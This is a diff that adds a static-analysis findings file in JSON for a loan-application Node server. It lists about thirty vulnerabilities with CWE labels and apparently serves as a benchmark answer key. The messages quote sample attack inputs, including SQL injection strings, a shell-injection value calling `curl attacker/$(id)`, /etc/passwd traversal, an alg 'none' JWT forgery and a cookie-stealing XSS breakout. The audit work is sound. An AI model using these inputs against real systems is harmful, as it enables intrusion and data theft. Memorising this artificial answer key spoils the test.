@@ -1,0 +1,780 @@
+{
+  "version": "1.0.0",
+  "results": [
+    {
+      "check_id": "javascript.security.injection.sql-injection",
+      "path": "server/src/controllers/loanApplicationController.ts",
+      "start": {
+        "line": 593,
+        "col": 5,
+        "offset": 20914
+      },
+      "end": {
+        "line": 595,
+        "col": 10,
+        "offset": 21028
+      },
+      "extra": {
+        "message": "SQL injection in searchApplicationsByCriteria (POST /api/applications/search, authenticated any role). Field names and values from the user-supplied req.body.filters object are concatenated directly into the query: qb.andWhere(`app.${field} = '${value}'`). A crafted value such as `x' OR 1=1 --` (or field like `riskTier = 'a' OR pg_sleep(5)--`) escapes the literal, letting an authenticated user read/modify arbitrary loan applications across all borrowers. The paired searchApplicationsByCriteriaSafe uses a whitelist + bound parameters.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-89: SQL Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.sql-injection",
+      "path": "server/src/controllers/importExportController.ts",
+      "start": {
+        "line": 167,
+        "col": 3,
+        "offset": 6358
+      },
+      "end": {
+        "line": 172,
+        "col": 5,
+        "offset": 6582
+      },
+      "extra": {
+        "message": "SQL injection in exportApplicationsByCustomFilter (GET /api/export/applications/custom-filter). searchTerm and sortColumn query parameters are interpolated directly into a raw SQL string: `WHERE purpose ILIKE '%${searchTerm}%' ORDER BY \"${column}\" DESC` and executed via AppDataSource.query(). A term value like `%' OR 1=1 --` breaks out of the ILIKE literal; the export-safe variant parameterizes term and whitelists sortColumn.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-89: SQL Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.command-injection",
+      "path": "server/src/controllers/importExportController.ts",
+      "start": {
+        "line": 288,
+        "col": 3,
+        "offset": 10835
+      },
+      "end": {
+        "line": 296,
+        "col": 4,
+        "offset": 11282
+      },
+      "extra": {
+        "message": "Command injection in renderApplicationDossier (GET /api/export/applications/:id/dossier/:preset, only authenticate). The URL params id and preset are concatenated into a shell command string `wkhtmltopdf --preset ${preset} --title \"Application ${id}\" ...` which is then executed with spawn('sh', ['-c', cmd], { shell: true }). A borrower can create their own application and inject shell metacharacters (e.g. preset=`x; curl attacker/$(id);`) for remote code execution as the server user. The scoped variant passes arguments as an array without a shell.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-78: OS Command Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.code-injection",
+      "path": "server/src/controllers/decisionController.ts",
+      "start": {
+        "line": 255,
+        "col": 5,
+        "offset": 9864
+      },
+      "end": {
+        "line": 257,
+        "col": 6,
+        "offset": 9965
+      },
+      "extra": {
+        "message": "Arbitrary JavaScript code execution in previewCustomPricingAdjustment (GET /api/decisions/:applicationId/pricing-adjustment-preview). The attacker-controlled `rule` query parameter is compiled and executed server-side via new Function('context', `with (context) { return ${rule}; }`). Any admin/underwriter (and anyone whose session is compromised) can run arbitrary Node.js code on the host (process.mainModule.require('child_process').execSync('...'), etc.). previewCustomPricingAdjustmentSafely replaces this with a ruleId whitelist.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-94: Code Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.path-traversal",
+      "path": "server/src/controllers/documentController.ts",
+      "start": {
+        "line": 342,
+        "col": 3,
+        "offset": 12451
+      },
+      "end": {
+        "line": 349,
+        "col": 3,
+        "offset": 12793
+      },
+      "extra": {
+        "message": "Path traversal allowing arbitrary file read in retrieveArchivedDocumentCopy (GET /api/documents/:id/archive-copy). The user-supplied folder and fileName query params are joined with path.join('archive', doc.applicationId, folder, fileName) with no containment check before fs.readFileSync(archivePath). folder=../../.. (URL-encoded) lets an authenticated user who can access any document read arbitrary files on the server (e.g. ../../../../etc/passwd). The -scoped variant adds a path.basename/prefix containment check (startsWith archiveRoot).",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Path Traversal"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.jwt-algorithm-confusion",
+      "path": "server/src/controllers/auditLogController.ts",
+      "start": {
+        "line": 77,
+        "col": 3,
+        "offset": 3090
+      },
+      "end": {
+        "line": 83,
+        "col": 4,
+        "offset": 3455
+      },
+      "extra": {
+        "message": "JWT algorithm-confusion authentication bypass in serveAuditRecordForPartner (GET /api/audit-logs/partner-feed is unauthenticated). jwt.verify(token, PARTNER_FEED_SECRET, { algorithms: ['HS256', 'none'] }) explicitly permits the 'none' algorithm, so an attacker can forge a token with header {alg:'none'} and an empty signature to obtain arbitrary entityType claims and read the entire audit trail (user IDs, actions, IP addresses, metadata) without any secret. The -verified variant restricts algorithms to HS256 and wraps verify in try/catch.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-347: Improper Verification of Cryptographic Signature"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.missing-authentication",
+      "path": "server/src/routes/applications.ts",
+      "start": {
+        "line": 9,
+        "col": 1,
+        "offset": 804
+      },
+      "end": {
+        "line": 9,
+        "col": 62,
+        "offset": 866
+      },
+      "extra": {
+        "message": "Missing authentication on GET /api/applications/portfolio-metrics. Unlike /api/applications/staff-portfolio-metrics (which requires admin/underwriter), this route has no authenticate middleware and calls getPortfolioMetrics, which returns every loan application's borrower email, business name, amount, status and risk tier to unauthenticated callers - a bulk disclosure of borrower PII and financial data.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-306: Missing Authentication for Critical Function"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.path-traversal",
+      "path": "server/src/controllers/messageController.ts",
+      "start": {
+        "line": 132,
+        "col": 3,
+        "offset": 4411
+      },
+      "end": {
+        "line": 134,
+        "col": 3,
+        "offset": 4526
+      },
+      "extra": {
+        "message": "Arbitrary file write in uploadMessageAttachment (POST /api/messages/:applicationId/attachments, memoryUpload with no size or MIME limits). multer's originalname is used verbatim: destPath = path.join(attachmentDir, req.file.originalname); fs.writeFileSync(destPath, req.file.buffer). A filename such as ../../app.js (or ../../../tmp/x) escapes public/message-attachments and lets any authenticated borrower write/overwrite arbitrary files on the host; oversized in-memory uploads also exhaust RAM. The -validated variant randomizes the stored name, checks MIME/size and writes under private/.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Path Traversal"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.ssrf.server-side-request-forgery",
+      "path": "server/src/controllers/webhookController.ts",
+      "start": {
+        "line": 100,
+        "col": 3,
+        "offset": 3949
+      },
+      "end": {
+        "line": 107,
+        "col": 6,
+        "offset": 4033
+      },
+      "extra": {
+        "message": "Server-Side Request Forgery in sendWebhookTestPing (POST /api/webhooks/:id/test-ping). The X-Test-Endpoint request header overrides the webhook target and the server performs fetch(targetUrl, ...) with no host/network allowlisting, so an admin (or an attacker who compromises an admin session) can make the server issue requests to internal services, cloud metadata endpoints (169.254.169.254) or arbitrary hosts. sendWebhookTestPingSafe restricts the override host to an allowlist.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-918: Server-Side Request Forgery"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.broken-access-control",
+      "path": "server/src/controllers/loanApplicationController.ts",
+      "start": {
+        "line": 253,
+        "col": 5,
+        "offset": 8989
+      },
+      "end": {
+        "line": 258,
+        "col": 6,
+        "offset": 9089
+      },
+      "extra": {
+        "message": "IDOR / broken access control in getPartnerCaseSummary (GET /api/applications/:id/partner-summary). Any borrower can view the case summary (borrower name, business name, product, amount, status, risk tier) of ANY other borrower's application by merely adding ?sharingMode=partner_shared - there is no record that the application was actually shared with this borrower or any partner. Ownership enforcement is bypassed with a user-controlled query string.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-639: Authorization Bypass Through User-Controlled Key"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.stored-xss",
+      "path": "server/src/controllers/loanApplicationController.ts",
+      "start": {
+        "line": 424,
+        "col": 5,
+        "offset": 15249
+      },
+      "end": {
+        "line": 426,
+        "col": 6,
+        "offset": 15363
+      },
+      "extra": {
+        "message": "Stored XSS in getPartnerEmbedWidget (and getPartnerEmbedWidgetScoped at lines 449-451). The DB values app.status and app.riskTier are interpolated into an HTML response without any encoding: `<div class=\"status-widget\"><span>${app.status}</span><span>${app.riskTier || ''}</span></div>`. riskTier is a free-form string set via createDecision/decisionSchema (riskTier: z.string()), so a value containing `<script>...` or `<img onerror=...>` executes in the browser of anyone viewing the embed widget.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-79: Cross-Site Scripting"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.open-redirect",
+      "path": "server/src/controllers/notificationController.ts",
+      "start": {
+        "line": 74,
+        "col": 3,
+        "offset": 2555
+      },
+      "end": {
+        "line": 75,
+        "col": 4,
+        "offset": 2685
+      },
+      "extra": {
+        "message": "Open redirect in acknowledgeAndReturn (POST /api/notifications/:id/acknowledge-and-return). The destination for res.redirect() is taken directly from the attacker-influenceable x-redirect-url or Referer header with no allowlist, so a notification link can bounce the (authenticated) user to an external phishing site. acknowledgeAndReturnSafe restricts redirects to an internal allowlist.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-601: URL Redirection to Untrusted Site"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.missing-authorization",
+      "path": "server/src/controllers/messageController.ts",
+      "start": {
+        "line": 208,
+        "col": 3,
+        "offset": 7293
+      },
+      "end": {
+        "line": 209,
+        "col": 6,
+        "offset": 7316
+      },
+      "extra": {
+        "message": "Broken access control / IDOR in getCorrespondenceEntry (GET /api/messages/:id). Any authenticated user (including a borrower) can fetch any message by id with no check of application ownership, assigned-underwriter, role or isInternal flag - so a borrower can read internal staff-only messages and messages belonging to other borrowers' applications (guessed/leaked UUIDs). The paired getCorrespondenceEntrySecure adds ownership and isInternal checks.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-862: Missing Authorization"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.xpath-injection",
+      "path": "server/src/controllers/documentController.ts",
+      "start": {
+        "line": 76,
+        "col": 3,
+        "offset": 2989
+      },
+      "end": {
+        "line": 77,
+        "col": 4,
+        "offset": 3040
+      },
+      "extra": {
+        "message": "XPath injection in lookupComplianceRecord (GET /api/documents/:id/compliance-record). The user-controlled record_type query parameter is concatenated unescaped into an XPath expression: registry.find(`/tenant[@id='${doc.applicationId}']/document[@type='${recordType}']`). Injecting XPath metacharacters can alter the predicate and return metadata records the caller should not see. lookupComplianceRecordVerified restricts record_type to an allowlist and escapes the interpolated strings.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-643: XPath Injection"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.http-header-injection",
+      "path": "server/src/controllers/documentController.ts",
+      "start": {
+        "line": 291,
+        "col": 3,
+        "offset": 10180
+      },
+      "end": {
+        "line": 292,
+        "col": 5,
+        "offset": 10250
+      },
+      "extra": {
+        "message": "HTTP header injection in exportDocumentPacket (GET /api/documents/:id/packet). The user-supplied export_name query parameter is placed unsanitized into the Content-Disposition header (`attachment; filename=\"${label}\"`). CRLF/quotes in export_name allow response-header injection or header corruption (Node throws on \\r\\n, turning this into an error/DoS and aborted download). The sibling exportReviewedPacket sanitizes the value with replace(/[\\r\\n]/g, ''), confirming the flaw.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.sensitive-data-exposure",
+      "path": "server/src/controllers/payoutController.ts",
+      "start": {
+        "line": 30,
+        "col": 3,
+        "offset": 1183
+      },
+      "end": {
+        "line": 35,
+        "col": 5,
+        "offset": 1312
+      },
+      "extra": {
+        "message": "Cleartext storage of sensitive financial data in attachPayoutAccount (POST /api/payouts/:id/account). routingNumber and accountNumber are persisted as plaintext in disbursement_accounts, whereas attachPayoutAccountEncrypted seals accountNumber with AES-256-GCM. A database leak or query-log exposure reveals full bank account + routing numbers. accountNumber is a text column (see entities/DisbursementAccount.ts:17-18).",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-312: Cleartext Storage of Sensitive Information"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.sensitive-data-in-logs",
+      "path": "server/src/controllers/borrowerProfileController.ts",
+      "start": {
+        "line": 132,
+        "col": 5,
+        "offset": 5221
+      },
+      "end": {
+        "line": 133,
+        "col": 5,
+        "offset": 5309
+      },
+      "extra": {
+        "message": "Sensitive data exposure in syncBorrowerTaxProfile (POST /api/profiles/:userId/tax-sync). On failure the entire raw request body - which contains the borrower's tax filing details (EIN, beneficial owner records, etc.) - is written to the logs: logger.error('Tax profile sync failed', { userId, payload: req.body, error: err }). The -safe variant logs only status/path/method.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-532: Insertion of Sensitive Information into Log File"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.session-fixation",
+      "path": "server/src/controllers/authController.ts",
+      "start": {
+        "line": 166,
+        "col": 3,
+        "offset": 6324
+      },
+      "end": {
+        "line": 167,
+        "col": 5,
+        "offset": 6356
+      },
+      "extra": {
+        "message": "Session fixation in completeAccountRecoveryAndSignIn (POST /api/auth/recovery/complete-and-signin): after a password reset the existing session id is reused (req.session.userId = user.id) without regenerating the session, so an attacker who can pre-establish/know a session id can ride the victim's newly privileged session. The '...-signin-secure' variant correctly calls req.session.regenerate() before signing the user in.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-384: Session Fixation"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.mass-assignment",
+      "path": "server/src/controllers/userController.ts",
+      "start": {
+        "line": 96,
+        "col": 3,
+        "offset": 3827
+      },
+      "end": {
+        "line": 98,
+        "col": 4,
+        "offset": 3894
+      },
+      "extra": {
+        "message": "Mass assignment in applyDirectorySyncPayload (POST /api/users/:id/directory-sync). The attacker-supplied JSON `payload` (from the query string) is parsed and merged straight onto the User entity with Object.assign(user, delta) then saved, allowing arbitrary properties (role, isActive, passwordHash, recoveryCode, email, ...) to be overwritten without validation. The -validated variant restricts updates to firstName/lastName via a Zod schema.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.uncontrolled-resource-consumption",
+      "path": "server/src/controllers/notificationController.ts",
+      "start": {
+        "line": 103,
+        "col": 3,
+        "offset": 3677
+      },
+      "end": {
+        "line": 105,
+        "col": 5,
+        "offset": 3776
+      },
+      "extra": {
+        "message": "Uncontrolled resource consumption / DoS in escalateOutstandingReminders (POST /api/notifications/applications/:applicationId/escalate-reminders). nudgeCount comes straight from the query string (parseInt(nudgeCount) || 1) with no upper bound and drives a loop that performs an awaited DB insert per iteration - requesting a value like 999999999999 creates an effectively unbounded number of notification rows, exhausting DB/CPU. The -throttled variant caps nudgeCount at MAX_REMINDER_NUDGES (5).",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-770: Allocation of Resources Without Limits"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.sql-injection",
+      "path": "server/src/controllers/documentController.ts",
+      "start": {
+        "line": 444,
+        "col": 5,
+        "offset": 16329
+      },
+      "end": {
+        "line": 445,
+        "col": 8,
+        "offset": 16394
+      },
+      "extra": {
+        "message": "SQL injection via ORDER BY in applyDocumentListLayout (GET /api/documents/workspace-view). layout.sortBy is parsed from an attacker-controlled base64 XML cookie (caseViewLayout) and concatenated unescaped into qb.orderBy(`doc.${layout.sortBy}`, 'DESC'). Because the column is not parameterized or whitelisted, a cookie value such as `createdAt DESC, (SELECT pg_sleep(10))` injects SQL. The -safe variant whitelists sortBy to ['createdAt','status','category'].",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-89: SQL Injection"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.xss",
+      "path": "server/src/controllers/lendingProductController.ts",
+      "start": {
+        "line": 72,
+        "col": 3,
+        "offset": 2627
+      },
+      "end": {
+        "line": 74,
+        "col": 4,
+        "offset": 2820
+      },
+      "extra": {
+        "message": "HTML/script injection (XSS) in getEmbeddableCalculatorWidget (GET /api/products/:id/widget, no auth). The widgetDisplayLabel cookie value is reflected unescaped inside an inline <script> element: `<script>window.__loanWidget = { productId: \"${product.id}\", label: \"${displayLabel}\" };</script>`. A label containing `\"</script><script>alert(document.cookie)</script>` breaks out of the JS string. The sibling getEmbeddableRateNotice escapes the value with escapeForScript().",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-79: Cross-Site Scripting"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.xxe",
+      "path": "server/src/controllers/reviewContinuityController.ts",
+      "start": {
+        "line": 110,
+        "col": 3,
+        "offset": 4462
+      },
+      "end": {
+        "line": 111,
+        "col": 5,
+        "offset": 4533
+      },
+      "extra": {
+        "message": "XML entity-expansion / XXE hazard in importLegacyQueueLayout (POST /api/review-continuity/queue-preferences/legacy-import). A base64-encoded XML document supplied via the legacyQueueLayoutXml cookie is decoded and parsed with xml2js (new GenericMarkupParser().parseStringPromise(markup)) without rejecting DOCTYPE/ENTITY declarations, enabling billion-laughs-style entity expansion or external-entity processing on server resources. The -safe variant rejects markup containing '<!DOCTYPE' or '<!ENTITY' (same pattern in documentController.applyDocumentListLayout at line 430).",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-611: Improper Restriction of XML External Entity Reference"
+          ],
+          "confidence": "LOW",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.information-exposure",
+      "path": "server/src/controllers/decisionController.ts",
+      "start": {
+        "line": 223,
+        "col": 5,
+        "offset": 8560
+      },
+      "end": {
+        "line": 225,
+        "col": 8,
+        "offset": 8694
+      },
+      "extra": {
+        "message": "Information disclosure via stack-trace echo in simulateDecisionOutcome (GET /api/decisions/:applicationId/simulate?mode=trace). Passing mode=trace makes the error handler return err.stack, err.message and internal context to the caller (res.status(500).json({ error: err.message, stack: err.stack, context: { applicationId, amount } })), leaking internal paths, SQL details and query values. simulateDecisionOutcomeSafely only logs to console in development.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-209: Generation of Error Message Containing Sensitive Information"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.path-traversal",
+      "path": "server/src/controllers/webhookController.ts",
+      "start": {
+        "line": 63,
+        "col": 3,
+        "offset": 2350
+      },
+      "end": {
+        "line": 64,
+        "col": 5,
+        "offset": 2428
+      },
+      "extra": {
+        "message": "Path traversal in previewWebhookPayloadTemplate (GET /api/webhooks/templates/:eventType/preview). eventType is a route parameter joined into a file path as path.join(PAYLOAD_TEMPLATE_ROOT, `${eventType}.json`) then read with fs.readFileSync. URL-encoded traversal (e.g. ..%2f..%2fpackage) escapes webhook-templates/ and reads arbitrary *.json files on disk. The -scoped variant resolves and verifies the path stays under templateRoot.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Path Traversal"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.hardcoded-secret",
+      "path": "server/src/index.ts",
+      "start": {
+        "line": 45,
+        "col": 5,
+        "offset": 1606
+      },
+      "end": {
+        "line": 45,
+        "col": 57,
+        "offset": 1658
+      },
+      "extra": {
+        "message": "Hardcoded fallback session secret: app.use(session({ secret: process.env.SESSION_SECRET || 'change-me-in-production', ... })). If SESSION_SECRET is not set in the environment, the session signing key is a publicly-known constant, letting anyone forge/decrypt session cookies and impersonate any user (including admin).",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-798: Use of Hard-coded Credentials"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.hardcoded-secret",
+      "path": "server/src/controllers/loanApplicationController.ts",
+      "start": {
+        "line": 17,
+        "col": 3,
+        "offset": 783
+      },
+      "end": {
+        "line": 17,
+        "col": 79,
+        "offset": 859
+      },
+      "extra": {
+        "message": "Hardcoded fallback signing key: const PARTNER_PASS_SECRET = process.env.PARTNER_PASS_SECRET || 'partner-viewing-pass-signing-key'. The partner viewing pass is a base64url(id).HMAC(payload) whose resolver (GET /api/applications/partner-pass/resolve, line 18 of routes/applications.ts) is unauthenticated; with the well-known default secret an attacker can forge passes for any application id and read any application's status/riskTier/product. The Scoped variant adds an expiry to the payload but relies on the same key.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-798: Use of Hard-coded Credentials"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.weak-randomness",
+      "path": "server/src/controllers/authController.ts",
+      "start": {
+        "line": 123,
+        "col": 5,
+        "offset": 4034
+      },
+      "end": {
+        "line": 123,
+        "col": 61,
+        "offset": 4090
+      },
+      "extra": {
+        "message": "Predictable account-recovery codes: sendAccountRecoveryLink generates the password-reset code with Math.random().toString(36).substring(2, 15). Math.random() is not cryptographically secure; a weak/guessable recovery code weakens the account-recovery (password reset) flow and enables account takeover. It should use crypto.randomBytes/randomInt.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-338: Use of Cryptographically Weak Pseudo-Random Number Generator"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.information-exposure",
+      "path": "server/src/controllers/importExportController.ts",
+      "start": {
+        "line": 41,
+        "col": 5,
+        "offset": 1709
+      },
+      "end": {
+        "line": 41,
+        "col": 51,
+        "offset": 1756
+      },
+      "extra": {
+        "message": "Information disclosure in generatePortfolioSummary (GET /api/export/portfolio-summary): on error the handler returns res.status(500).json({ error: err.message, stack: err.stack }), echoing the raw exception message and full stack trace (internal paths, env hints) to the caller. generateComplianceSummary is the hardened sibling - it returns only a generated errorId and logs server-side.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-209: Generation of Error Message Containing Sensitive Information"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.hardcoded-secret",
+      "path": "server/src/services/secretsManagerClient.ts",
+      "start": {
+        "line": 20,
+        "col": 3,
+        "offset": 927
+      },
+      "end": {
+        "line": 20,
+        "col": 32,
+        "offset": 956
+      },
+      "extra": {
+        "message": "Hardcoded/static fallback encryption key for payout data: when Vault env vars are absent, getPayoutEncryptionKey() returns Buffer.alloc(32, 7) - a fixed, publicly-known 32-byte key. All AES-GCM-encrypted disbursement account numbers and remittance memos are then decryptable by anyone who knows this constant.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-798: Use of Hard-coded Credentials"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.credential-in-url",
+      "path": "server/src/controllers/borrowerProfileController.ts",
+      "start": {
+        "line": 173,
+        "col": 3,
+        "offset": 6796
+      },
+      "end": {
+        "line": 177,
+        "col": 4,
+        "offset": 7099
+      },
+      "extra": {
+        "message": "Sensitive API key transmitted insecurely in pushProfileToPartnerCrm (POST /api/profiles/:userId/crm-sync): the CRM API key is placed in the URL query string of a request to a plain-HTTP gateway (default http://crm-gateway.partner-net.internal/contacts/upsert?api_key=...). Keys in URLs leak into proxies/access logs and the plaintext HTTP transport exposes them on the network. pushProfileToPartnerCrmSecure uses an HTTPS endpoint and sends the key as an Authorization: Bearer header.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-598: Use of GET Request Method With Sensitive Query Strings"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    }
+  ]
+}
